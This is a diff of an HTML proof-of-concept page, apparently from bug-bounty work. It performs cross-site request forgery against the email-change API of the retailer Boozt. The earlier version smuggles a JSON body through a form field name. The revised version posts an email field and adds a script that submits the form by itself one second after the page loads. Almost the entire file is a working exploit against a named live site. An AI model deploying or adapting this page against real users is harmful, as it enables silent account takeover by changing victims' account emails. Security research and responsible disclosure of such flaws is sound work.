@@ -1,19 +1,22 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 
 <head>
-    <title>Boozt CSRF Content-Type Confusion POC</title>
+    <meta charset="utf-8">
+    <title>Test Boozt CSRF</title>
 </head>
 
 <body>
-    <h1>Boozt CSRF Content-Type Confusion POC</h1>
-    <form id="csrf-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
-        enctype="application/x-www-form-urlencoded">
-        <input type="hidden" name='{"email":"absolutexon+csrfindex@wearehackerone.com"}' value=''>
-        <input type="submit" value="Exploit CSRF">
+    <form id="f" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST">
+        <input type="hidden" name="email" value="absolutexon+test2323@wearehackerone.com">
+        <input type="submit" value="Submit (manual)">
     </form>
-    <p>Make sure you are logged in to Boozt in another tab, then click the button above. If the email changes, the
-        vulnerability is confirmed.</p>
+
+    <script>
+        // auto-submit after 1s so you can open devtools
+        setTimeout(() => document.getElementById('f').submit(), 1000);
+    </script>
+    <p>Form will auto-submit in 1s. If you don't want auto-submit, remove the script.</p>
 </body>
 
 </html>
